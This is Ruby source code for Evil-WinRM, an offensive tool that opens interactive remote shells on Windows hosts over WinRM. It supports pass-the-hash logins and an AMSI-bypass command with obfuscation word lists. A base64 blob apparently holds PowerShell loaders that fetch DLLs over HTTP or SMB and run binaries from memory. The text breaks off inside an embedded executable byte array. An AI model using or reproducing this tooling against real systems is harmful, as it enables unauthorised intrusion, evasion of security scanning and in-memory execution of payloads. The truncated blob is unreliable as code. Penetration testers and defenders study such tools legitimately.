#!/usr/bin/env ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'
require 'fileutils'
require 'logger'

# Constants

# Version
VERSION = '3.3'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3

# Global vars

# Global vars

# Available commands
$LIST = ['Bypass-4MSI', 'services', 'upload', 'download', 'menu', 'exit']
$COMMANDS = $LIST.dup
$CMDS = $COMMANDS.clone
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# Colors and path completion
$colors_enabled = true
$check_rpath_completion = true

# Path for ps1 scripts and exec files
$scripts_path = ""
$executables_path = ""

# Connection vars initialization
$host = ""
$port = "5985"
$user = ""
$password = ""
$url = "wsman"
$default_service = "HTTP"
$full_logging_path = ENV["HOME"]+"/evil-winrm-logs"

# Redefine download method from winrm-fs
module WinRM
    module FS
        class FileManager
            def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
                @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
                index = 0
                output = _output_from_file(remote_path, chunk_size, index)
                return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2

                return false if output.exitcode >= 1

                File.open(local_path, 'wb') do |fd|
                    out = _write_file(fd, output)
                    index += out.length
                    until out.empty?
                        if size != -1
                            yield index, size
                        end
                        output = _output_from_file(remote_path, chunk_size, index)
                        return false if output.exitcode >= 1

                        out = _write_file(fd, output)
                        index += out.length
                    end
                end
            end

            true
        end
    end
end

# Class creation
class EvilWinRM

    # Initialization
    def initialize()
        @directories = Hash.new
        @cache_ttl = 10
        @executables = Array.new
        @functions = Array.new
        @Bypass_4MSI_loaded = false
        @bypass_amsi_words_random_case = [
            "[Runtime.InteropServices.Marshal]",
            "function ",
            "WriteByte",
            "[Ref]",
            "Assembly.GetType",
            "GetField",
            "[System.Net.WebUtility]",
            "HtmlDecode",
            "Reflection.BindingFlags",
            "NonPublic",
            "Static",
            "GetValue",
            "Patched!"
        ]
        @bypass_amsi_function_names = [
            "Clear-Host-",
            "ConvertFrom-SddlString-",
            "Format-Hex-",
            "Get-FileHash-",
            "Get-Verb-",
            "Import-PowerShellDataFile-",
            "ImportSystemModules-",
            "New-Guid-",
            "New-TemporaryFile-",
            "show-methods-loaded-"
        ]

        @bypass_amsi_main_function_name = "__FUNCTION_NAME__"
    end

    # Remote path completion compatibility check
    def completion_check()
        if $check_rpath_completion == true then
             begin
                 Readline.quoting_detection_proc
                    @completion_enabled = true
                rescue NotImplementedError => err
                    @completion_enabled = false
                    self.print_message("Remote path completions is disabled due to ruby limitation: #{err.to_s}", TYPE_WARNING)
                    self.print_message("For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion", TYPE_DATA)
                end
        else
            @completion_enabled = false
            self.print_message("Remote path completion is disabled", TYPE_WARNING)
        end

    end

    # Arguments
    def arguments()
        options = { port:$port, url:$url, service:$service }
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]"
            opts.on("-S", "--ssl", "Enable ssl") do |val|
                $ssl = true
                options[:port] = "5986"
            end
            opts.on("-c", "--pub-key PUBLIC_KEY_PATH", "Local path to public key certificate") { |val| options[:pub_key] = val }
            opts.on("-k", "--priv-key PRIVATE_KEY_PATH", "Local path to private key certificate") { |val| options[:priv_key] = val }
            opts.on("-r", "--realm DOMAIN", "Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }") { |val| options[:realm] = val.upcase }
            opts.on("-s", "--scripts PS_SCRIPTS_PATH", "Powershell scripts local path") { |val| options[:scripts] = val }
            opts.on("--spn SPN_PREFIX", "SPN prefix for Kerberos auth (default HTTP)") { |val| options[:service] = val }
            opts.on("-e", "--executables EXES_PATH", "C# executables local path") { |val| options[:executables] = val }
            opts.on("-i", "--ip IP", "Remote host IP or hostname. FQDN for Kerberos auth (required)") { |val| options[:ip] = val }
            opts.on("-U", "--url URL", "Remote url endpoint (default /wsman)") { |val| options[:url] = val }
            opts.on("-u", "--user USER", "Username (required if not using kerberos)") { |val| options[:user] = val }
            opts.on("-p", "--password PASS", "Password") { |val| options[:password] = val }
            opts.on("-H", "--hash HASH", "NTHash") do |val|
                if !options[:password].nil? and !val.nil?
                    self.print_header()
                    self.print_message("You must choose either password or hash auth. Both at the same time are not allowed", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                if !val.match /^[a-fA-F0-9]{32}$/
                    self.print_header()
                    self.print_message("Invalid hash format", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                options[:password] = "00000000000000000000000000000000:#{val}"
            end
            opts.on("-P", "--port PORT", "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-V", "--version", "Show version") do |val|
                puts("v#{VERSION}")
                self.custom_exit(0, false)
            end
            opts.on("-n", "--no-colors", "Disable colors") do |val|
                $colors_enabled = false
            end
            opts.on("-N", "--no-rpath-completion", "Disable remote path completion") do |val|
                $check_rpath_completion = false
            end
            opts.on("-l","--log","Log the WinRM session") do|val|
                $log = true
                $filepath = ""
                $logfile = ""
                $logger = ""
            end
            opts.on("-h", "--help", "Display this help message") do
                self.print_header()
                puts(opts)
                puts()
                self.custom_exit(0, false)
            end
        end

        begin
            optparse.parse!
        if options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil? then
            mandatory = [:ip, :user]
        else
            mandatory = [:ip]
        end
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            self.print_header()
            self.print_message($!.to_s, TYPE_ERROR, true, $logger)
            puts(optparse)
            puts()
            custom_exit(1, false)
        end

        if options[:password].nil? and options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil?
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end

        $host = options[:ip]
        $user = options[:user]
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
        $url = options[:url]
        $pub_key = options[:pub_key]
        $priv_key = options[:priv_key]
        $realm = options[:realm]
        $service = options[:service]
        if !$log.nil? then
            if !Dir.exists?($full_logging_path)
                Dir.mkdir $full_logging_path
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m"))
                Dir.mkdir $full_logging_path + "/" + Time.now.strftime("%Y%d%m")
            end
            if !Dir.exists?($full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host)
                Dir.mkdir $full_logging_path+ "/" + Time.now.strftime("%Y%d%m") + "/" + $host
            end
            $filepath = $full_logging_path + "/" + Time.now.strftime("%Y%d%m") + "/" + $host + "/" + Time.now.strftime("%H%M%S")
            $logger = Logger.new($filepath)
            $logger.formatter = proc do |severity, datetime, progname, msg|
                "#{datetime}: #{msg}\n"
            end
        end
        if !$realm.nil? then
            if $service.nil? then
                $service = $default_service
            end
        end
    end

    # Print script header
    def print_header()
         puts()
         self.print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
     end

    # Generate connection object
    def connection_initialization()
        if $ssl then
            if $pub_key and $priv_key then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    client_cert: $pub_key,
                    client_key: $priv_key,
                )
            else
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl
                )
            end

        elsif !$realm.nil? then
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: "",
                password: "",
                transport: :kerberos,
                realm: $realm,
                service: $service
            )
        else
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: $user,
                password: $password,
                :no_ssl_peer_verification => true
            )
        end
    end

    # Detect if a docker environment
    def docker_detection()
        if File.exist?("/.dockerenv") then
            return true
        else
            return false
        end
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35"}
        color_code = colors[color]
        return "\001\033[0;#{color_code}m\002#{text}\001\033[0m\002"
    end

    # Messsage printing
    def print_message(msg, msg_type=TYPE_INFO, prefix_print=true, log=nil)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        else
            msg_prefix = ""
            color = "default"
        end

        if !prefix_print then
            msg_prefix = ""
        end
        if $colors_enabled then
            puts(self.colorize("#{msg_prefix}#{msg}", color))
        else
            puts("#{msg_prefix}#{msg}")
        end

        if !log.nil?
            log.info("#{msg_prefix}#{msg}")
        end
        puts()
    end

    # Certificates validation
    def check_certs(pub_key, priv_key)
         if !File.file?(pub_key) then
            self.print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !File.file?($priv_key) then
            self.print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil? then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) } || []
        return files.grep(/^*\.(ps1|psd1|psm1)$/)
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(a_path)
        parts = self.get_dir_parts(a_path)
        my_dir = parts[0]
        grep_for = parts[1]

        my_dir = File.expand_path(my_dir)
        my_dir = my_dir + "/" unless my_dir[-1] == '/'

        files = Dir.glob("#{my_dir}*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{my_dir}*").select {|f| File.directory? f}

        result = files + directories || []

        result.grep( /^#{Regexp.escape(my_dir)}#{grep_for}/i ).uniq
    end

    # Custom exit
    def custom_exit(exit_code = 0, message_print=true)
        if message_print then
            if exit_code == 0 then
                puts()
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_INFO, true, $logger)
            elsif exit_code == 1 then
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            elsif exit_code == 130 then
                puts()
                self.print_message("Exiting...", TYPE_INFO, true, $logger)
            else
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR, true, $logger)
            end
        end
        exit(exit_code)
    end

    # Progress bar
    def progress_bar(bytes_done, total_bytes)
        progress = ((bytes_done.to_f / total_bytes.to_f) * 100).round
        progress_bar = (progress / 10).round
        progress_string = "▓" * (progress_bar-1).clamp(0,9)
        progress_string = progress_string + "▒" + ("░" * (10-progress_bar))
        message = "Progress: #{progress}% : |#{progress_string}|          \r"
        print message
    end

    # Get filesize
    def filesize(shell, path)
        size = shell.run("(get-item '#{path}').length").output.strip.to_i
        return size
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        file_manager = WinRM::FS::FileManager.new($conn)
        self.print_header()
        self.completion_check()

        # Log check
        if !$log.nil? then
            self.print_message("Logging Enabled. Log file: #{$filepath}", TYPE_WARNING, true)
        end

        # SSL checks
        if !$ssl and ($pub_key or $priv_key) then
            self.print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING, true, $logger)
        elsif $ssl
            self.print_message("SSL enabled", TYPE_WARNING)
        end

        if $ssl and ($pub_key or $priv_key) then
            self.check_certs($pub_key, $priv_key)
        end

        # Kerberos checks
         if !$user.nil? and !$realm.nil?
            self.print_message("User is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if !$password.nil? and !$realm.nil?
            self.print_message("Password is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING, true, $logger)
        end

        if $realm.nil? and !$service.nil? then
            self.print_message("Useless spn provided, only used for Kerberos auth", TYPE_WARNING, true, $logger)
        end

        if !$scripts_path.nil? then
            self.check_directories($scripts_path, "scripts")
            @functions = self.read_scripts($scripts_path)
            self.silent_warnings do
                $LIST = $LIST + @functions
            end
        end

        if !$executables_path.nil? then
            self.check_directories($executables_path, "executables")
            @executables = self.read_executables($executables_path)
        end
        menu = Base64.decode64("JG1lbnUgPSBAIgogICAsLiAgICggICAuICAgICAgKSAgICAgICAgICAgICAgICIgICAgICAgICAgICAsLiAgICggICAuICAgICAgKSAgICAgICAuICAgCiAgKCIgICggICkgICknICAgICAsJyAgICAgICAgICAgICAoYCAgICAgJ2AgICAgKCIgICAgICkgICknICAgICAsJyAgIC4gICwpICAKLjsgKSAgJyAoKCAoIiApICAgIDsoLCAgICAgIC4gICAgIDspICAiICApIiAgLjsgKSAgJyAoKCAoIiApICAgKTsoLCAgICkoKCAgIApfIi4sXywuX18pLiwpICguLl8oIC5fKSwgICAgICkgICwgKC5fLi4oICcuLl8iLl8sIC4gJy5fKV8oLi4sXyhfIi4pIF8oIF8nKSAgClxfICAgX19fX18vX18gIF98X198ICB8ICAgICgoICAoICAvICBcICAgIC8gIFxfX3wgX19fX1xfX19fX18gICBcICAvICAgICBcICAKIHwgICAgX18pX1wgIFwvIC8gIHwgIHwgICAgO18pXycpIFwgICBcL1wvICAgLyAgfC8gICAgXHwgICAgICAgXy8gLyAgXCAvICBcIAogfCAgICAgICAgXFwgICAvfCAgfCAgfF9fIC9fX19fXy8gIFwgICAgICAgIC98ICB8ICAgfCAgXCAgICB8ICAgXC8gICAgWSAgICBcCi9fX19fX19fICAvIFxfLyB8X198X19fXy8gICAgICAgICAgIFxfXy9cICAvIHxfX3xfX198ICAvX19fX3xfICAvXF9fX198X18gIC8KICAgICAgICBcLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcLyAgICAgICAgICBcLyAgICAgICBcLyAgICAgICAgIFwvIAogICAgICAgICAgQnk6IEN5YmVyVmFjYSwgT3NjYXJBa2FFbHZpcywgTGFveCwgQXJhbGU2MSBASGFja3BsYXllcnMKIkAKCmlmICgkZnVuY2lvbmVzX3ByZXZpYXMuY291bnQgLWxlIDEpIHskZnVuY2lvbmVzX3ByZXZpYXMgPSAobHMgZnVuY3Rpb246KS5OYW1lfQpmdW5jdGlvbiBtZW51IHsKW2FycmF5XSRmdW5jaW9uZXNfbnVldmFzID0gKGxzIGZ1bmN0aW9uOiB8IFdoZXJlLU9iamVjdCB7KCRfLm5hbWUpLkxlbmd0aCAtZ2UgIjQiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiQ2xlYXItSG9zdCoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiQ29udmVydEZyb20tU2RkbFN0cmluZyoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiRm9ybWF0LUhleCoiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiR2V0LUZpbGVIYXNoKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtVmVyYioiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiaGVscCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJJbXBvcnQtUG93ZXJTaGVsbERhdGFGaWxlKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJJbXBvcnRTeXN0ZW1Nb2R1bGVzKiIgLWFuZCAkXy5uYW1lIC1uZSAiTWFpbiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgImNkLi4iIC1hbmQgJF8ubmFtZSAtbmUgIm1rZGlyIiAtYW5kICRfLm5hbWUgLW5lICJtb3JlIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIk5ldy1HdWlkKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJOZXctVGVtcG9yYXJ5RmlsZSoiIC1hbmQgJF8ubmFtZSAtbmUgIlBhdXNlIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIlRhYkV4cGFuc2lvbjIqIiAtYW5kICRfLm5hbWUgLW5lICJwcm9tcHQiIC1hbmQgJF8ubmFtZSAtbmUgIm1lbnUiIC1hbmQgJF8ubmFtZSAtbmUgImF1dG8iIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAic2hvdy1tZXRob2RzLWxvYWRlZCoiIH0gfCBzZWxlY3Qtb2JqZWN0IG5hbWUgKS5uYW1lCiRtdWVzdHJhX2Z1bmNpb25lcyA9ICgkZnVuY2lvbmVzX251ZXZhcyB8IHdoZXJlIHskZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7ImBuWytdICRfIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtZW51ID0gJG1lbnUgKyAkbXVlc3RyYV9mdW5jaW9uZXMgKyAiYG4iCiRtZW51ID0gJG1lbnUgLXJlcGxhY2UgIiBbK10iLCJbK10iCldyaXRlLUhvc3QgJG1lbnUKCn0KCmZ1bmN0aW9uIERsbC1Mb2FkZXIgewogICAgcGFyYW0oW3N3aXRjaF0kc21iLCBbc3dpdGNoXSRsb2NhbCwgW3N3aXRjaF0kaHR0cCwgW3N0cmluZ10kcGF0aCkKCiAgICAkaGVscD1AIgouU1lOT1BTSVMKICAgIGRsbCBsb2FkZXIuCiAgICBQb3dlclNoZWxsIEZ1bmN0aW9uOiBEbGwtTG9hZGVyCiAgICBBdXRob3I6IEhlY3RvciBkZSBBcm1hcyAoM3Y0U2kwTikKCiAgICBSZXF1aXJlZCBkZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIGRlcGVuZGVuY2llczogTm9uZQouREVTQ1JJUFRJT04KICAgIC4KLkVYQU1QTEUKICAgIERsbC1Mb2FkZXIgLXNtYiAtcGF0aCBcXDE5Mi4xNjguMTM5LjEzMlxcc2hhcmVcXG15RGxsLmRsbAogICAgRGxsLUxvYWRlciAtbG9jYWwgLXBhdGggQzpcVXNlcnNcUGVwaXRvXERlc2t0b3BcbXlEbGwuZGxsCiAgICBEbGwtTG9hZGVyIC1odHRwIC1wYXRoIGh0dHA6Ly9leGFtcGxlLmNvbS9teURsbC5kbGwKCiAgICBEZXNjcmlwdGlvbgogICAgLS0tLS0tLS0tLS0KICAgIEZ1bmN0aW9uIHRoYXQgbG9hZHMgYW4gYXJiaXRyYXJ5IGRsbAoiQAoKICAgIGlmICgoJHNtYiAtZXEgJGZhbHNlIC1hbmQgJGxvY2FsIC1lcSAkZmFsc2UgLWFuZCAkaHR0cCAtZXEgJGZhbHNlKSAtb3IgKCRwYXRoIC1lcSAiIiAtb3IgJHBhdGggLWVxICRudWxsKSkKICAgIHsKICAgICAgICB3cml0ZS1ob3N0ICIkaGVscGBuIgogICAgfQogICAgZWxzZQogICAgewoKICAgICAgICBpZiAoJGh0dHApCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgYnkgSFRUUCIKICAgICAgICAgICAgJHdlYmNsaWVudCA9IFtTeXN0ZW0uTmV0LldlYkNsaWVudF06Om5ldygpCiAgICAgICAgICAgICRkbGwgPSAkd2ViY2xpZW50LkRvd25sb2FkRGF0YSgkcGF0aCkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYoJHNtYil7IFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBTTUIiIH0KICAgICAgICAgICAgZWxzZSB7IFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBsb2NhbGx5IiB9CgogICAgICAgICAgICAkZGxsID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRwYXRoKQogICAgICAgIH0KICAgICAgICAKCiAgICAgICAgaWYgKCRkbGwgLW5lICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIExvYWRpbmcgZGxsLi4uIgogICAgICAgICAgICAkYXNzZW1ibHlfbG9hZGVkID0gW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkZGxsKQogICAgICAgICAgICAkb2JqID0gKCgkYXNzZW1ibHlfbG9hZGVkLkdldEV4cG9ydGVkVHlwZXMoKSB8IFNlbGVjdC1PYmplY3QgRGVjbGFyZWRNZXRob2RzICkuRGVjbGFyZWRNZXRob2RzIHwgV2hlcmUtT2JqZWN0IHskXy5pc3B1YmxpYyAtZXEgJHRydWV9IHwgU2VsZWN0LU9iamVjdCBEZWNsYXJpbmdUeXBlLG5hbWUgLVVuaXF1ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSApCiAgICAgICAgICAgIFthcnJheV0kbWV0aG9kcyA9IGZvcmVhY2ggKCRhc3NlbWJseXByb3BlcnRpZXMgaW4gJG9iaikgeyAkbmFtZXNwYWNlID0gJGFzc2VtYmx5cHJvcGVydGllcy5EZWNsYXJpbmdUeXBlLnRvc3RyaW5nKCk7ICRtZXRvZG8gPSAkYXNzZW1ibHlwcm9wZXJ0aWVzLm5hbWUudG9zdHJpbmcoKTsgIlsiICsgJG5hbWVzcGFjZSArICJdIiArICI6OiIgKyAkbWV0b2RvICsgIigpIiB9CiAgICAgICAgICAgICRtZXRob2RzID0gJG1ldGhvZHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUgOyAkZ2xvYmFsOnNob3dtZXRob2RzID0gICAoJG1ldGhvZHN8IHdoZXJlIHsgJGdsb2JhbDpzaG93bWV0aG9kcyAgLW5vdGNvbnRhaW5zICRffSkgfCBmb3JlYWNoIHsiJF9gbiJ9CiAgICAgICAgICAgIAogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gYXV0byB7ClthcnJheV0kZnVuY2lvbmVzX251ZXZhcyA9IChscyBmdW5jdGlvbjogfCBXaGVyZS1PYmplY3QgeygkXy5uYW1lKS5MZW5ndGggLWdlICI0IiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNsZWFyLUhvc3QqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNvbnZlcnRGcm9tLVNkZGxTdHJpbmciIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiRm9ybWF0LUhleCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtRmlsZUhhc2gqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1WZXJiKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJoZWxwIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnQtUG93ZXJTaGVsbERhdGFGaWxlIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnRTeXN0ZW1Nb2R1bGVzIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAiY2QuLiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgIm1vcmUiIC1hbmQgJF8ubmFtZSAtbmUgIk5ldy1HdWlkIiAtYW5kICRfLm5hbWUgLW5lICJOZXctVGVtcG9yYXJ5RmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiUGF1c2UiIC1hbmQgJF8ubmFtZSAtbmUgIlRhYkV4cGFuc2lvbjIiIC1hbmQgJF8ubmFtZSAtbmUgInByb21wdCIgLWFuZCAkXy5uYW1lIC1uZSAibWVudSIgLWFuZCAkXy5uYW1lIC1uZSAic2hvdy1tZXRob2RzLWxvYWRlZCJ9IHwgc2VsZWN0LW9iamVjdCBuYW1lICkubmFtZQokbXVlc3RyYV9mdW5jaW9uZXMgPSAoJGZ1bmNpb25lc19udWV2YXMgfCB3aGVyZSB7JGZ1bmNpb25lc19wcmVjYXJnYWRhcyAtbm90Y29udGFpbnMgJF99KSB8IGZvcmVhY2ggeyIkX2BuIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtdWVzdHJhX2Z1bmNpb25lcwoKCn0KZnVuY3Rpb24gSW52b2tlLUJpbmFyeSB7cGFyYW0oJGFyZykKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgRXhlY3V0ZSBiaW5hcmllcyBmcm9tIG1lbW9yeS4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IEludm9rZS1CaW5hcnkKICAgIEF1dGhvcjogTHVpcyBWYWNhcyAoQ3liZXJWYWNhKQoKICAgIFJlcXVpcmVkIGRlcGVuZGVuY2llczogTm9uZQogICAgT3B0aW9uYWwgZGVwZW5kZW5jaWVzOiBOb25lCi5ERVNDUklQVElPTgogICAgCi5FWEFNUExFCiAgICBJbnZva2UtQmluYXJ5IC9vcHQvY3NoYXJwL1dhdHNvbi5leGUKICAgIEludm9rZS1CaW5hcnkgL29wdC9jc2hhcnAvQmluYXJ5LmV4ZSBwYXJhbTEscGFyYW0yLHBhcmFtMwogICAgSW52b2tlLUJpbmFyeSAvb3B0L2NzaGFycC9CaW5hcnkuZXhlICdwYXJhbTEsIHBhcmFtMiwgcGFyYW0zJwogICAgRGVzY3JpcHRpb24KICAgIC0tLS0tLS0tLS0tCiAgICBGdW5jdGlvbiB0aGF0IGV4ZWN1dGUgYmluYXJpZXMgZnJvbSBtZW1vcnkuCgoKIkAKaWYgKCRhcmcgLWVxICRudWxsKSB7JGhlbHB9IGVsc2UgewpbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoW2J5dGVbXV1AKDc3LCA5MCwgMTQ0LCAwLCAzLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAyNTUsIDI1NSwgMCwgMCwgMTg0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTI4LCAwLCAwLCAwLCAxNCwgMzEsIDE4NiwgMTQsIDAsIDE4MCwgOSwgMjA1LCAzMywgMTg0LCAxLCA3NiwgMjA1LCAzMywgODQsIDEwNCwgMTA1LCAxMTUsIDMyLCAxMTIsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMzIsIDk5LCA5NywgMTEwLCAxMTAsIDExMSwgMTE2LCAzMiwgOTgsIDEwMSwgMzIsIDExNCwgMTE3LCAxMTAsIDMyLCAxMDUsIDExMCwgMzIsIDY4LCA3OSwgODMsIDMyLCAxMDksIDExMSwgMTAwLCAxMDEsIDQ2LCAxMywgMTMsIDEwLCAzNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgODAsIDY5LCAwLCAwLCA3NiwgMSwgMywgMCwgMjQ1LCAxODIsIDIzMSwgOTIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDIyNCwgMCwgMiwgMzMsIDExLCAxLCAxMSwgMCwgMCwgMTAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDk0LCA0MSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMzIsIDAsIDAsIDAsIDIsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMywgMCwgOTYsIDEzMywgMCwgMCwgMTYsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMiwgNDEsIDAsIDAsIDc5LCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgNDAsIDMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsID